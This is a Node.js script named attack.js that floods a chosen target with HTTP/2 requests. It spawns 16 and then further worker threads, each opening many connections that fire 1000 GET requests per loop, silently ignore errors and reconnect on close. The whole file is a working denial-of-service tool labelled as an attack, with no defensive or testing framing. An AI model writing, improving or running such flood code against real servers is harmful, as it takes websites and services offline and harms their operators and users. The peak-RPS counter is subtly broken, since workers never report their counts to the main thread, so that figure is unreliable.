const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = 16;  // Use 16 threads initially, as you have 16 vCPUs
const INITIAL_CONNECTIONS = 20;  // Initial number of connections per worker
const POWER_MULTIPLIER = 2;  // Power increase factor
const WARMUP_TIME = 5000;  // 5 seconds warm-up before full load

let peakRps = 0;
let requestCount = 0;
let startTime = Date.now();

// Function to log RPS
function logRps() {
    const currentTime = Date.now();
    const elapsedSeconds = (currentTime - startTime) / 1000;
    const rps = requestCount / elapsedSeconds;
    peakRps = Math.max(peakRps, rps);
    console.log(`Peak RPS: ${peakRps.toFixed(2)}`);
}

// Worker logic to handle requests
if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);

    // Start with initial power (THREADS x INITIAL_CONNECTIONS)
    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration, initial: true } });
    }

    // After the warm-up period (5 seconds), double the power
    setTimeout(() => {
        console.log('Doubling the power after warm-up period...');
        // Increase the number of threads and connections for the next phase
        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
            new Worker(__filename, { workerData: { target, duration, initial: false } });
        }
    }, WARMUP_TIME);

    // Periodically log peak RPS
    setInterval(logRps, 1000);

} else {
    const { target, duration, initial } = workerData;
    const end = Date.now() + duration * 1000;
    let connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;

    function startFlood(client) {
        const floodInterval = setInterval(() => {
            if (Date.now() > end) {
                clearInterval(floodInterval);
                return;
            }

            try {
                // Fire a high number of concurrent requests (aggressive flooding)
                for (let i = 0; i < 1000; i++) {
                    const req = client.request({ ':path': '/', ':method': 'GET' });
                    req.on('error', () => {});
                    req.end();
                    requestCount++;  // Increment total request count for RPS calculation
                }
            } catch (err) {
                // Ignore errors but continue flooding
            }
        }, 0); // Immediate request firing for max load
    }

    function createConnection() {
        let client;
        try {
            client = http2.connect(target);
        } catch (err) {
            return setTimeout(createConnection, 250);  // Retry connection
        }

        client.on('error', () => {});  // Ignore connection errors
        client.on('close', () => setTimeout(createConnection, 100));  // Reconnect on close
        client.on('connect', () => startFlood(client));  // Start flooding when connected
    }

    // Create multiple connections per worker
    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
